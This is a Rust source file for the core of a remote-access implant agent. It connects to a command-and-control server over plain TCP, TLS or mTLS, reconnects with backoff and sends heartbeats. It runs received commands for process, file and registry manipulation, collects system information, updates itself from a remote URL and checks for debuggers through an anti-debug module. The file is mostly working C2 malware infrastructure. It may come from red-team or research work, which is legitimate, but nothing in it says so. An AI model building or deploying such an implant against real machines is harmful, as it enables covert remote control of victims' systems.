use agent_hardening::anti_debug;
use agent_modules::{execution, file_manager, monitoring, process_manager, registry_manager};
use crypto::tls::{build_tls_connector, load_certs, load_private_key, TlsError};
use protocol::framing::{self, FramingError};
use protocol::messages::{Command, Response};
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use tokio::time;
use tokio_rustls::TlsConnector;

mod persistence;
pub use persistence::{AgentState, C2State, StateManager};

/// Configuration for agent connection and reconnection.
#[derive(Clone)]
pub struct ConnectionConfig {
    /// Address of the C2 server (e.g., "127.0.0.1:9000").
    pub server_addr: String,
    /// Interval between heartbeats in seconds (default: 30).
    pub heartbeat_interval: u64,
    /// Initial backoff delay in seconds on reconnect (default: 1).
    pub reconnect_base_delay: u64,
    /// Maximum backoff delay in seconds (default: 300 / 5 minutes).
    pub reconnect_max_delay: u64,
    /// Multiplier applied after each failed reconnect attempt (default: 2).
    pub reconnect_multiplier: f64,
}

impl Default for ConnectionConfig {
    fn default() -> Self {
        Self {
            server_addr: "127.0.0.1:9000".to_string(),
            heartbeat_interval: 30,
            reconnect_base_delay: 1,
            reconnect_max_delay: 300,
            reconnect_multiplier: 2.0,
        }
    }
}

/// Connection mode for the agent.
#[derive(Default, Clone)]
pub enum ConnectionMode {
    /// Connect without TLS (cleartext).
    #[default]
    Plain,
    /// Connect with TLS but no client certificate.
    Tls {
        connector: Arc<TlsConnector>,
        server_name: String,
    },
    /// Connect with mTLS (client certificate presented).
    Mtls {
        connector: Arc<TlsConnector>,
        server_name: String,
    },
}

pub struct AgentCore {
    pub id: u32,
    pub config: ConnectionConfig,
    /// How this agent connects to the C2.
    pub connection_mode: ConnectionMode,
}

impl AgentCore {
    #[must_use]
    pub fn new(id: u32) -> Self {
        Self {
            id,
            config: ConnectionConfig::default(),
            connection_mode: ConnectionMode::Plain,
        }
    }

    /// Create an agent with a custom connection configuration.
    #[must_use]
    pub fn with_config(id: u32, config: ConnectionConfig) -> Self {
        Self {
            id,
            config,
            connection_mode: ConnectionMode::Plain,
        }
    }

    /// Create an agent that connects using TLS (server-auth only).
    pub fn with_tls(id: u32, ca_cert_path: &str, server_name: &str) -> Result<Self, TlsError> {
        let ca_certs = load_certs(ca_cert_path)?;
        let ca_cert = ca_certs
            .into_iter()
            .next()
            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
        let connector = build_tls_connector(ca_cert, None, None)?;
        Ok(Self {
            id,
            config: ConnectionConfig::default(),
            connection_mode: ConnectionMode::Tls {
                connector: Arc::new(connector),
                server_name: server_name.to_string(),
            },
        })
    }

    /// Create an agent that connects using mTLS (mutual authentication).
    pub fn with_mtls(
        id: u32,
        ca_cert_path: &str,
        client_cert_path: &str,
        client_key_path: &str,
        server_name: &str,
    ) -> Result<Self, TlsError> {
        let ca_certs = load_certs(ca_cert_path)?;
        let ca_cert = ca_certs
            .into_iter()
            .next()
            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
        let client_certs = load_certs(client_cert_path)?;
        let client_key = load_private_key(client_key_path)?;
        let connector =
            build_tls_connector(ca_cert, Some(client_certs), Some(client_key))?;
        Ok(Self {
            id,
            config: ConnectionConfig::default(),
            connection_mode: ConnectionMode::Mtls {
                connector: Arc::new(connector),
                server_name: server_name.to_string(),
            },
        })
    }

    /// Upgrade a raw TCP stream to TLS if configured.
    ///
    /// Returns an opaque handle that can be split into reader/writer halves.
    async fn maybe_wrap_tcp(&self, stream: TcpStream) -> Result<WrappedStream, Box<dyn std::error::Error>> {
        match &self.connection_mode {
            ConnectionMode::Plain => Ok(WrappedStream::Plain(stream)),
            ConnectionMode::Tls { connector, server_name }
            | ConnectionMode::Mtls { connector, server_name } => {
                let name: rustls_pki_types::ServerName<'static> = server_name
                    .clone()
                    .try_into()
                    .map_err(|_| "invalid DNS name for TLS")?;
                let tls_stream = connector.connect(name, stream).await?;
                log::info!("TLS handshake completed for agent {}", self.id);
                Ok(WrappedStream::Tls(tls_stream))
            }
        }
    }

    /// Run the agent loop: connect to C2, send heartbeats, process commands,
    /// and reconnect on failure with exponential backoff.
    pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        loop {
            match self.connect_and_listen().await {
                Ok(()) => {
                    log::info!("Agent {} disconnected cleanly", self.id);
                }
                Err(e) => {
                    log::error!("Agent {} connection error: {e}", self.id);
                }
            }

            // Reconnect with exponential backoff.
            let mut delay = self.config.reconnect_base_delay;
            loop {
                log::info!(
                    "Agent {} reconnecting in {delay}s (max {}s)",
                    self.id,
                    self.config.reconnect_max_delay
                );
                time::sleep(Duration::from_secs(delay)).await;

                match TcpStream::connect(&self.config.server_addr).await {
                    Ok(_stream) => {
                        log::info!("Agent {} reconnected to {}", self.id, self.config.server_addr);
                        break;
                    }
                    Err(e) => {
                        log::warn!(
                            "Agent {} reconnect failed: {e} (will retry in {delay}s)",
                            self.id
                        );
                        delay = (delay as f64 * self.config.reconnect_multiplier).ceil() as u64;
                        if delay > self.config.reconnect_max_delay {
                            delay = self.config.reconnect_max_delay;
                        }
                    }
                }
            }
        }
    }

    /// Connect to the C2, split the stream, and run the heartbeat + command
    /// loop until the connection drops.
    async fn connect_and_listen(&self) -> Result<(), Box<dyn std::error::Error>> {
        let raw_stream = TcpStream::connect(&self.config.server_addr).await?;
        log::info!("Agent {} connected to {}", self.id, self.config.server_addr);

        let stream = self.maybe_wrap_tcp(raw_stream).await?;
        let (mut reader, mut writer) = stream.split();

        self.run_agent_loop(&mut reader, &mut writer).await
    }

    /// Main loop: select between heartbeat ticks and incoming C2 commands.
    ///
    /// On every heartbeat tick, send a `Heartbeat` command to the C2.
    /// On every received message, deserialize it as a `Command` and
    /// dispatch through `handle_command`, sending the response back.
    async fn run_agent_loop<R, W>(
        &self,
        reader: &mut R,
        writer: &mut W,
    ) -> Result<(), Box<dyn std::error::Error>>
    where
        R: AsyncRead + Unpin + Send,
        W: AsyncWrite + Unpin + Send,
    {
        let mut interval = time::interval(Duration::from_secs(self.config.heartbeat_interval));
        interval.tick().await; // skip the first immediate tick

        loop {
            tokio::select! {
                _ = interval.tick() => {
                    // Send a Heartbeat command to the C2.
                    if let Err(e) = framing::write_message(writer, &Command::Heartbeat).await {
                        log::error!("Agent {} heartbeat write failed: {e}", self.id);
                        return Err(e.into());
                    }
                    log::debug!("Agent {} heartbeat sent", self.id);
                }
                result = framing::read_message::<Command, R>(reader) => {
                    match result {
                        Ok(cmd) => {
                            log::info!("Agent {} received command: {:?}", self.id, cmd);

                            // Report debugger presence as a security event.
                            if anti_debug::is_being_debugged() {
                                log::warn!("Security: agent process appears to be under debugging");
                            }

                            // The C2 sends Heartbeat as a keep-alive check.
                            // Respond with Success rather than dispatching to handle_command.
                            let response: Response = match &cmd {
                                Command::Heartbeat => Response::HeartbeatAck,
                                Command::SelfUpdate { url, expected_hash } => {
                                    execution::self_update(url.as_str(), expected_hash.as_str()).await
                                        .unwrap_or_else(|| {
                                            Response::Failure { error: "self-update returned None".into() }
                                        })
                                }
                                other => self.handle_command(other).await.unwrap_or_else(|| {
                                    Response::Failure { error: "no handler for command".into() }
                                }),
                            };

                            if let Err(e) = framing::write_message(writer, &response).await {
                                log::error!("Agent {} failed to send response: {e}", self.id);
                                return Err(e.into());
                            }
                        }
                        Err(FramingError::Io(e)) => {
                            // Connection closed or I/O error — exit so we reconnect.
                            log::info!("Agent {} connection closed: {e}", self.id);
                            return Err(e.into());
                        }
                        Err(e) => {
                            log::error!("Agent {} framing error: {e}", self.id);
                            // Send a failure response and continue.
                            let _ = framing::write_message(writer, &Response::Failure {
                                error: format!("protocol error: {e}"),
                            }).await;
                        }
                    }
                }
            }
        }
    }

    /// Handle an incoming command from the C2 server.
    ///
    /// Commands are validated against a whitelist before execution.
    /// Unknown or unregistered commands are rejected with a Failure
    /// response.
    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        match cmd {
            cmd @ Command::Execute { .. } => {
                if let Command::Execute { cmd: raw } = cmd {
                    if raw.starts_with("proc:") {
                        process_manager::execute(cmd).await
                    } else if raw.starts_with("file:") {
                        file_manager::execute(cmd).await
                    } else if raw.starts_with("reg:") {
                        registry_manager::execute(cmd).await
                    } else {
                        Some(Response::Failure {
                            error: format!("unknown command prefix: {raw}"),
                        })
                    }
                } else {
                    Some(Response::Failure {
                        error: "invalid execute command".into(),
                    })
                }
            }
            Command::GetSysInfo => monitoring::get_sysinfo().await,
            Command::Heartbeat => Some(Response::HeartbeatAck),
            Command::SelfUpdate { url, expected_hash } => {
                execution::self_update(url, expected_hash).await
            }
        }
    }

    /// Generate a heartbeat response.
    pub async fn heartbeat(&self) -> Response {
        Response::HeartbeatAck
    }
}

// ---------------------------------------------------------------------------
// Wrapped stream — allows the agent to work with plain TCP or TLS
// transparently.
// ---------------------------------------------------------------------------

enum WrappedStream {
    Plain(TcpStream),
    Tls(tokio_rustls::client::TlsStream<TcpStream>),
}

impl WrappedStream {
    /// Split into reader and writer halves that implement AsyncRead + AsyncWrite
    /// independently, so `run_agent_loop` can hold them in separate variables
    /// and pass them to `tokio::select!`.
    fn split(self) -> (ReadHalf, WriteHalf) {
        match self {
            WrappedStream::Plain(s) => {
                let (r, w) = tokio::io::split(s);
                (ReadHalf::Plain(r), WriteHalf::Plain(w))
            }
            WrappedStream::Tls(s) => {
                let (r, w) = tokio::io::split(s);
                (ReadHalf::Tls(r), WriteHalf::Tls(w))
            }
        }
    }
}

pub enum ReadHalf {
    Plain(tokio::io::ReadHalf<TcpStream>),
    Tls(tokio::io::ReadHalf<tokio_rustls::client::TlsStream<TcpStream>>),
}

impl AsyncRead for ReadHalf {
    fn poll_read(
        self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &mut tokio::io::ReadBuf<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        match self.get_mut() {
            Self::Plain(ref mut r) => std::pin::Pin::new(r).poll_read(cx, buf),
            Self::Tls(ref mut r) => std::pin::Pin::new(r).poll_read(cx, buf),
        }
    }
}

pub enum WriteHalf {
    Plain(tokio::io::WriteHalf<TcpStream>),
    Tls(tokio::io::WriteHalf<tokio_rustls::client::TlsStream<TcpStream>>),
}

impl AsyncWrite for WriteHalf {
    fn poll_write(
        self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &[u8],
    ) -> std::task::Poll<Result<usize, std::io::Error>> {
        match self.get_mut() {
            Self::Plain(ref mut w) => std::pin::Pin::new(w).poll_write(cx, buf),
            Self::Tls(ref mut w) => std::pin::Pin::new(w).poll_write(cx, buf),
        }
    }

    fn poll_flush(
        self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<Result<(), std::io::Error>> {
        match self.get_mut() {
            Self::Plain(ref mut w) => std::pin::Pin::new(w).poll_flush(cx),
            Self::Tls(ref mut w) => std::pin::Pin::new(w).poll_flush(cx),
        }
    }

    fn poll_shutdown(
        self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<Result<(), std::io::Error>> {
        match self.get_mut() {
            Self::Plain(ref mut w) => std::pin::Pin::new(w).poll_shutdown(cx),
            Self::Tls(ref mut w) => std::pin::Pin::new(w).poll_shutdown(cx),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::AgentCore;
    use protocol::messages::{Command, Response};

    #[tokio::test]
    async fn execute_commands_return_module_status() {
        let agent = AgentCore::new(1);
        let response = agent
            .handle_command(&Command::Execute {
                cmd: "proc:request".to_string(),
            })
            .await;

        assert!(matches!(response, Some(Response::Failure { .. })));
    }

    #[tokio::test]
    async fn heartbeat_returns_ack() {
        let agent = AgentCore::new(1);
        let response = agent.heartbeat().await;
        assert_eq!(response, Response::HeartbeatAck);
    }

    #[test]
    fn default_config_has_reasonable_values() {
        let config = super::ConnectionConfig::default();
        assert_eq!(config.heartbeat_interval, 30);
        assert_eq!(config.reconnect_base_delay, 1);
        assert_eq!(config.reconnect_max_delay, 300);
        assert!((config.reconnect_multiplier - 2.0).abs() < 0.01);
    }

    #[test]
    fn agent_connection_mode_defaults_to_plain() {
        let agent = AgentCore::new(1);
        assert!(matches!(agent.connection_mode, super::ConnectionMode::Plain));
    }
}